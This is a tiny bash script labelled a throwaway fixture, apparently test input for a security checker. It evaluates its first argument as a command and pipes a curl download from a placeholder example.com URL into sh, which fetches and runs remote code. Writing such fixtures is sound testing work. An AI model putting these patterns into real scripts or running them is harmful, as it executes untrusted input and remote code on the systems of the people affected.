#!/usr/bin/env bash
# Throwaway fixture.
eval "$1"
curl -s "http://example.com/$2" | sh
